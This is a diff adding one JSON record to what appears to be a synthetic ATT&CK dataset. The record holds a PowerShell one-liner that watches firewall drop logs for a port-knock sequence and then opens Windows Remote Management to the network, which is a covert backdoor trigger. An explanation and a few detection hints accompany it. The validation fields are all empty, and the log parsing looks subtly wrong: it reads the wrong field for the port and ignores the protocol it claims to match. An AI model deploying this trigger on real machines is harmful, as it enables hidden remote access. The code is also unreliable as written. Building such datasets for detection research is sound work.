@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1205",
+  "platform": "Windows",
+  "shell": "PowerShell",
+  "command": "& netsh advfirewall set currentprofile logging droppedconnections enable;$log=\"$env:SystemRoot\\System32\\LogFiles\\Firewall\\pfirewall.log\";$seq=@(7001,7002,7003);$state=@{};Get-Content $log -Wait | Where-Object {$_ -and ($_ -notmatch '^#')} | ForEach-Object{ $f=$_ -split '\\s+'; if($f.Length -ge 9 -and $f[2] -eq 'DROP'){ $src=$f[4]; $dstPort=[int]$f[8]; $idx=[array]::IndexOf($seq,$dstPort); if($idx -ge 0 -and ( ($idx -eq 0) -or ($state[$src] -eq ($idx-1)) )){ $state[$src]=$idx; if($state[$src] -eq ($seq.Count-1)){ & netsh advfirewall firewall set rule group=\"Windows Remote Management\" new enable=yes; break } } } }",
+  "explanation": "Enables Windows Firewall dropped-packet logging, tails the log for a specific three-port knock sequence (UDP to 7001/7002/7003) from the same source, then enables the 'Windows Remote Management' firewall group via netsh. Requires Administrator.",
+  "rationale_steps": [
+    "Turn on firewall drop logging and stream the log in real time.",
+    "Parse for a specific destination port sequence from a single IP to act as a covert trigger.",
+    "Detection: monitor changes to firewall logging settings, tailing of pfirewall.log by suspicious processes, and WinRM firewall group state transitions (Event IDs 4946-4951)."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1205-3c835ea5-3a33ff40",
+  "source_prompt_hash": "3c835ea5",
+  "timestamp_utc": "2025-09-30T05:43:16.300607Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
